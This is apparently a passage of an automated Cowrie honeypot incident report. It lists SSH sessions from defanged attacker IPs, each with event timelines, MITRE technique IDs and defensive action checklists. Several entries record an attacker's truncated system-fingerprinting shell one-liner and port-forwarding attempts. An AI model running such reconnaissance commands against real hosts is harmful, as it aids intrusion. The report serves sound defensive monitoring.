| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:04:15` | `cowrie.session.connect` |
| `2026-08-11 06:04:15` | `cowrie.client.version` |
| `2026-08-11 06:04:15` | `cowrie.client.kex` |
| `2026-08-11 06:04:16` | `cowrie.login.success` |
| `2026-08-11 06:04:17` | `cowrie.session.params` |
| `2026-08-11 06:04:17` | `cowrie.command.input` |
| `2026-08-11 06:04:17` | `cowrie.command.input` |
| `2026-08-11 06:04:17` | `cowrie.command.input` |
| `2026-08-11 06:04:17` | `cowrie.command.input` |
| `2026-08-11 06:04:17` | `cowrie.command.input` |
| `2026-08-11 06:04:17` | `cowrie.command.success` |
| `2026-08-11 06:04:17` | `cowrie.command.input` |
| `2026-08-11 06:04:17` | `cowrie.command.input` |
| `2026-08-11 06:04:17` | `cowrie.command.input` |
| `2026-08-11 06:04:17` | `cowrie.command.input` |
| `2026-08-11 06:04:17` | `cowrie.log.closed` |
| `2026-08-11 06:04:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46ae83fcd7d0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 06:06 |
| **Last Seen** | 2026-08-11 06:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:06:11` | `cowrie.session.connect` |
| `2026-08-11 06:06:11` | `cowrie.client.version` |
| `2026-08-11 06:06:11` | `cowrie.client.kex` |
| `2026-08-11 06:06:12` | `cowrie.login.success` |
| `2026-08-11 06:06:13` | `cowrie.session.params` |
| `2026-08-11 06:06:13` | `cowrie.command.input` |
| `2026-08-11 06:06:13` | `cowrie.command.input` |
| `2026-08-11 06:06:13` | `cowrie.command.input` |
| `2026-08-11 06:06:13` | `cowrie.command.input` |
| `2026-08-11 06:06:13` | `cowrie.command.input` |
| `2026-08-11 06:06:13` | `cowrie.command.success` |
| `2026-08-11 06:06:13` | `cowrie.command.input` |
| `2026-08-11 06:06:13` | `cowrie.command.input` |
| `2026-08-11 06:06:13` | `cowrie.command.input` |
| `2026-08-11 06:06:13` | `cowrie.command.input` |
| `2026-08-11 06:06:13` | `cowrie.log.closed` |
| `2026-08-11 06:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-102124a3ddeb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 06:08 |
| **Last Seen** | 2026-08-11 06:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:08:11` | `cowrie.session.connect` |
| `2026-08-11 06:08:11` | `cowrie.client.version` |
| `2026-08-11 06:08:11` | `cowrie.client.kex` |
| `2026-08-11 06:08:11` | `cowrie.login.success` |
| `2026-08-11 06:08:12` | `cowrie.session.params` |
| `2026-08-11 06:08:12` | `cowrie.command.input` |
| `2026-08-11 06:08:12` | `cowrie.command.input` |
| `2026-08-11 06:08:12` | `cowrie.command.input` |
| `2026-08-11 06:08:12` | `cowrie.command.input` |
| `2026-08-11 06:08:12` | `cowrie.command.input` |
| `2026-08-11 06:08:12` | `cowrie.command.success` |
| `2026-08-11 06:08:12` | `cowrie.command.input` |
| `2026-08-11 06:08:12` | `cowrie.command.input` |
| `2026-08-11 06:08:12` | `cowrie.command.input` |
| `2026-08-11 06:08:12` | `cowrie.command.input` |
| `2026-08-11 06:08:13` | `cowrie.log.closed` |
| `2026-08-11 06:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5b3bb5d67a1

| Field | Detail |
|---|---|
| **Source IP** | `152.32.208[.]9` |
| **First Seen** | 2026-08-11 06:15 |
| **Last Seen** | 2026-08-11 06:15 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:15:12` | `cowrie.session.connect` |
| `2026-08-11 06:15:12` | `cowrie.login.success` |
| `2026-08-11 06:15:12` | `cowrie.session.params` |
| `2026-08-11 06:15:30` | `cowrie.log.closed` |
| `2026-08-11 06:15:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.208[.]9` to AbuseIPDB if not already reported
- [ ] Block `152.32.208[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47804b037c82

| Field | Detail |
|---|---|
| **Source IP** | `152.32.208[.]9` |
| **First Seen** | 2026-08-11 06:15 |
| **Last Seen** | 2026-08-11 06:16 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6, User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0[.]0 Safari/537.36 Edg/120.0.0[.]0` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:15:48` | `cowrie.session.connect` |
| `2026-08-11 06:15:48` | `cowrie.login.success` |
| `2026-08-11 06:15:49` | `cowrie.session.params` |
| `2026-08-11 06:15:49` | `cowrie.command.input` |
| `2026-08-11 06:15:49` | `cowrie.command.failed` |
| `2026-08-11 06:15:49` | `cowrie.command.input` |
| `2026-08-11 06:15:49` | `cowrie.command.input` |
| `2026-08-11 06:16:07` | `cowrie.log.closed` |
| `2026-08-11 06:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.208[.]9` to AbuseIPDB if not already reported
- [ ] Block `152.32.208[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0cd8ef91cc8

| Field | Detail |
|---|---|
| **Source IP** | `152.32.208[.]9` |
| **First Seen** | 2026-08-11 06:16 |
| **Last Seen** | 2026-08-11 06:16 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:16:07` | `cowrie.session.connect` |
| `2026-08-11 06:16:07` | `cowrie.login.success` |
| `2026-08-11 06:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.208[.]9` to AbuseIPDB if not already reported
- [ ] Block `152.32.208[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c04dabbd9fe

| Field | Detail |
|---|---|
| **Source IP** | `196.219.93[.]98` |
| **First Seen** | 2026-08-11 06:19 |
| **Last Seen** | 2026-08-11 06:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:19:45` | `cowrie.session.connect` |
| `2026-08-11 06:19:46` | `cowrie.client.version` |
| `2026-08-11 06:19:46` | `cowrie.client.kex` |
| `2026-08-11 06:19:47` | `cowrie.login.success` |
| `2026-08-11 06:19:47` | `cowrie.direct-tcpip.request` |
| `2026-08-11 06:19:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.219.93[.]98` to AbuseIPDB if not already reported
- [ ] Block `196.219.93[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-861b6c813e85

| Field | Detail |
|---|---|
| **Source IP** | `61.169.54[.]150` |
| **First Seen** | 2026-08-11 06:19 |
| **Last Seen** | 2026-08-11 06:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:19:53` | `cowrie.session.connect` |
| `2026-08-11 06:19:53` | `cowrie.client.version` |
| `2026-08-11 06:19:53` | `cowrie.client.kex` |
| `2026-08-11 06:19:56` | `cowrie.login.success` |
| `2026-08-11 06:19:57` | `cowrie.direct-tcpip.request` |
| `2026-08-11 06:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.169.54[.]150` to AbuseIPDB if not already reported
- [ ] Block `61.169.54[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-394d1c25d420

| Field | Detail |
|---|---|
| **Source IP** | `34.78.185[.]249` |
| **First Seen** | 2026-08-11 06:25 |
| **Last Seen** | 2026-08-11 06:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:25:15` | `cowrie.session.connect` |
| `2026-08-11 06:25:15` | `cowrie.client.version` |
| `2026-08-11 06:25:15` | `cowrie.client.kex` |
| `2026-08-11 06:25:17` | `cowrie.login.success` |
| `2026-08-11 06:25:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.185[.]249` to AbuseIPDB if not already reported
- [ ] Block `34.78.185[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-765b644e4fca

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-11 06:26 |
| **Last Seen** | 2026-08-11 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:26:02` | `cowrie.session.connect` |
| `2026-08-11 06:26:02` | `cowrie.client.version` |
| `2026-08-11 06:26:03` | `cowrie.client.kex` |
| `2026-08-11 06:26:04` | `cowrie.login.success` |
| `2026-08-11 06:26:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-790f858c3be8

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-11 06:26 |
| **Last Seen** | 2026-08-11 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:26:02` | `cowrie.session.connect` |
| `2026-08-11 06:26:02` | `cowrie.client.version` |
| `2026-08-11 06:26:03` | `cowrie.client.kex` |
| `2026-08-11 06:26:04` | `cowrie.login.success` |
| `2026-08-11 06:26:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f7c0f9add86

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-11 06:26 |
| **Last Seen** | 2026-08-11 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:26:13` | `cowrie.session.connect` |
| `2026-08-11 06:26:13` | `cowrie.client.version` |
| `2026-08-11 06:26:13` | `cowrie.client.kex` |
| `2026-08-11 06:26:14` | `cowrie.login.success` |
| `2026-08-11 06:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ba0a941a2b9

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-11 06:26 |
| **Last Seen** | 2026-08-11 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:26:14` | `cowrie.session.connect` |
| `2026-08-11 06:26:14` | `cowrie.client.version` |
| `2026-08-11 06:26:15` | `cowrie.client.kex` |
| `2026-08-11 06:26:16` | `cowrie.login.success` |
| `2026-08-11 06:26:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a32f908a9e4

| Field | Detail |
|---|---|
| **Source IP** | `60.251.229[.]144` |
| **First Seen** | 2026-08-11 06:36 |
| **Last Seen** | 2026-08-11 06:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:36:23` | `cowrie.session.connect` |
| `2026-08-11 06:36:24` | `cowrie.client.version` |
| `2026-08-11 06:36:24` | `cowrie.client.kex` |
| `2026-08-11 06:36:26` | `cowrie.login.success` |
| `2026-08-11 06:36:26` | `cowrie.direct-tcpip.request` |
| `2026-08-11 06:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.251.229[.]144` to AbuseIPDB if not already reported
- [ ] Block `60.251.229[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9ad4f05411e

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-08-11 06:36 |
| **Last Seen** | 2026-08-11 06:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:36:31` | `cowrie.session.connect` |
| `2026-08-11 06:36:32` | `cowrie.client.version` |
| `2026-08-11 06:36:32` | `cowrie.client.kex` |
| `2026-08-11 06:36:34` | `cowrie.login.success` |
| `2026-08-11 06:36:35` | `cowrie.direct-tcpip.request` |
| `2026-08-11 06:36:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c4cdd2663d2

| Field | Detail |
|---|---|
| **Source IP** | `121.189.226[.]81` |
| **First Seen** | 2026-08-11 06:40 |
| **Last Seen** | 2026-08-11 06:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:40:37` | `cowrie.session.connect` |
| `2026-08-11 06:40:38` | `cowrie.client.version` |
| `2026-08-11 06:40:38` | `cowrie.client.kex` |
| `2026-08-11 06:40:39` | `cowrie.login.success` |
| `2026-08-11 06:40:40` | `cowrie.direct-tcpip.request` |
| `2026-08-11 06:40:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.226[.]81` to AbuseIPDB if not already reported
- [ ] Block `121.189.226[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c37113a456af

| Field | Detail |
|---|---|
| **Source IP** | `101.13.1[.]58` |
| **First Seen** | 2026-08-11 06:40 |
| **Last Seen** | 2026-08-11 06:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:40:50` | `cowrie.session.connect` |
| `2026-08-11 06:40:51` | `cowrie.client.version` |
| `2026-08-11 06:40:51` | `cowrie.client.kex` |
| `2026-08-11 06:40:53` | `cowrie.login.success` |
| `2026-08-11 06:40:54` | `cowrie.direct-tcpip.request` |
| `2026-08-11 06:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.1[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.13.1[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43a9f4cc185f

| Field | Detail |
|---|---|
| **Source IP** | `177.159.150[.]111` |
| **First Seen** | 2026-08-11 06:45 |
| **Last Seen** | 2026-08-11 06:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:45:29` | `cowrie.session.connect` |
| `2026-08-11 06:45:30` | `cowrie.client.version` |
| `2026-08-11 06:45:30` | `cowrie.client.kex` |
| `2026-08-11 06:45:31` | `cowrie.login.success` |
| `2026-08-11 06:45:32` | `cowrie.direct-tcpip.request` |
| `2026-08-11 06:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.159.150[.]111` to AbuseIPDB if not already reported
- [ ] Block `177.159.150[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fb064cb9a69

| Field | Detail |
|---|---|
| **Source IP** | `122.187.234[.]54` |
| **First Seen** | 2026-08-11 06:45 |
| **Last Seen** | 2026-08-11 06:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:45:37` | `cowrie.session.connect` |
| `2026-08-11 06:45:38` | `cowrie.client.version` |
| `2026-08-11 06:45:38` | `cowrie.client.kex` |
| `2026-08-11 06:45:40` | `cowrie.login.success` |
| `2026-08-11 06:45:41` | `cowrie.direct-tcpip.request` |
| `2026-08-11 06:45:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.234[.]54` to AbuseIPDB if not already reported
- [ ] Block `122.187.234[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4f726c41f27

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 06:55 |
| **Last Seen** | 2026-08-11 06:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:55:20` | `cowrie.session.connect` |
| `2026-08-11 06:55:21` | `cowrie.client.version` |
| `2026-08-11 06:55:21` | `cowrie.client.kex` |
| `2026-08-11 06:55:23` | `cowrie.login.success` |
| `2026-08-11 06:55:25` | `cowrie.session.params` |
| `2026-08-11 06:55:25` | `cowrie.command.input` |
| `2026-08-11 06:55:25` | `cowrie.command.input` |
| `2026-08-11 06:55:25` | `cowrie.command.input` |
| `2026-08-11 06:55:25` | `cowrie.command.input` |
| `2026-08-11 06:55:25` | `cowrie.command.input` |
| `2026-08-11 06:55:25` | `cowrie.command.success` |
| `2026-08-11 06:55:25` | `cowrie.command.input` |
| `2026-08-11 06:55:25` | `cowrie.command.input` |
| `2026-08-11 06:55:25` | `cowrie.command.input` |
| `2026-08-11 06:55:25` | `cowrie.command.input` |
| `2026-08-11 06:55:26` | `cowrie.log.closed` |
| `2026-08-11 06:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27df2f513ae2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 06:57 |
| **Last Seen** | 2026-08-11 06:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 06:57:35` | `cowrie.session.connect` |
| `2026-08-11 06:57:35` | `cowrie.client.version` |
| `2026-08-11 06:57:35` | `cowrie.client.kex` |
| `2026-08-11 06:57:38` | `cowrie.login.success` |
| `2026-08-11 06:57:39` | `cowrie.session.params` |
| `2026-08-11 06:57:39` | `cowrie.command.input` |
| `2026-08-11 06:57:39` | `cowrie.command.input` |
| `2026-08-11 06:57:39` | `cowrie.command.input` |
| `2026-08-11 06:57:39` | `cowrie.command.input` |
| `2026-08-11 06:57:39` | `cowrie.command.input` |
| `2026-08-11 06:57:39` | `cowrie.command.success` |
| `2026-08-11 06:57:39` | `cowrie.command.input` |
| `2026-08-11 06:57:39` | `cowrie.command.input` |
| `2026-08-11 06:57:39` | `cowrie.command.input` |
| `2026-08-11 06:57:39` | `cowrie.command.input` |
| `2026-08-11 06:57:40` | `cowrie.log.closed` |
| `2026-08-11 06:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a48b3195ef2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 06:59 |
| **Last Seen** | 2026-08-11 07:00 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
